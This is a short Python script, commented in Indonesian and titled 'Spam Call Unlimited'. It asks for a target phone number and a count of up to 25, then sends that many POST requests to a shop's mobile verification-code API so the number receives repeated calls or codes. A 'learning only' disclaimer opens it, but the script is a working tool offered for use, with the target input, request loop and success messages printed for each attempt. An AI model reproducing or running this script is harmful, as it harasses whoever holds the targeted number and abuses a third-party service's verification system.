'''Jangan di recode ya bossku, hanya untuk pembelajaran ;)'''
# mengimport module
import requests, json
import time
# mendapatkan waktu sekitar
ti = time.localtime()
t = time.strftime("%H:%M:%S", ti)
# varibel warna
class w:
 m = '\033[1;31m' # merah
 b = '\033[1;36m' # biru
 k = '\033[1;33m' # kuning
 h = '\033[1;32m' # hijau
 u = '\033[1;35m' # ungu
 p = '\033[1;37m' # putih
 i = '\033[1;90m' # abu abu
 ut = '\033[1;34m' # ungu tua
 c = '\033[1;96m' # cyan
# variabel url, headers dan data
# banner sc
def banner():
    # cetak banner
    print (f"""{w.k}╔═╗╔═╗╔═╗╔╦╗  ╔═╗╔═╗╦  ╦  
{w.m}╚═╗╠═╝╠═╣║║║  ║  ╠═╣║  ║  
{w.c}╚═╝╩  ╩ ╩╩ ╩  ╚═╝╩ ╩╩═╝╩═╝""")
# subbanner sc
def subbanner():
    # cetak subbanner
    print (f"""\n
{w.i}[{w.p}•{w.i}] {w.m}Author {w.i}: {w.h}abilseno11
{w.i}[{w.p}•{w.i}] {w.m}Nama Sc {w.i}: {w.h}Spam Call Unlimited
{w.i}[{w.p}•{w.i}] {w.m}Github {w.i}: {w.h}https://github.com/AbilSeno
""")
# main
def main():
    url = 'https://api.vader-api.com/account/sendmobilecodeasync.json'
    hd = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}
    # mengambil input dari user
    # str = string
    no = str(input(f"{w.i}[{w.c}{t}{w.i}] {w.i}[{w.c}INPUT{w.i}] {w.h}Masukkan nomor target (contoh:881xxx) {w.i}> {w.u}"))
    dat = json.dumps(['62'+no,'Vader Shop'])
    # int = bilangan bulat
    jum = int(input(f"{w.i}[{w.c}{t}{w.i}] {w.i}[{w.c}INPUT{w.i}] {w.h}Masukkan jumlah spam (max:25) {w.i}> {w.u}"))
    # peringatan jika input jumlah melebihi angka 25
    if jum > 25:
     print (f"{w.i}[{w.c}{t}{w.i}] {w.i}[{w.m}ERROR{w.i}] {w.m}Jumlah terlalu besar, maks 25!!!")
     main()
    # jika tidak
    else:
     # spam mendefinsikan index
     # range() untuk membuat perulangan sesuai dengan input jumlah
     for spam in range(jum):
      r = requests.Session()
      # membuat http post dengan module requests
      mulai = r.post(url,headers=hd,data=dat).text
      # jika ada error di mulai response
      if 'error' in mulai:
       print (f"{w.i}[{w.c}{t}{w.i}] {w.i}[{w.m}GAGAL{w.i}] {w.k}Spam ke {no}")
      # jika tidak
      else:
       print (f"{w.i}[{w.c}{t}{w.i}] {w.i}[{w.h}SUKSES{w.i}] {w.k}Spam ke {no}")
# jalankan
if __name__ == '__main__':
   banner()
   subbanner()
   main()
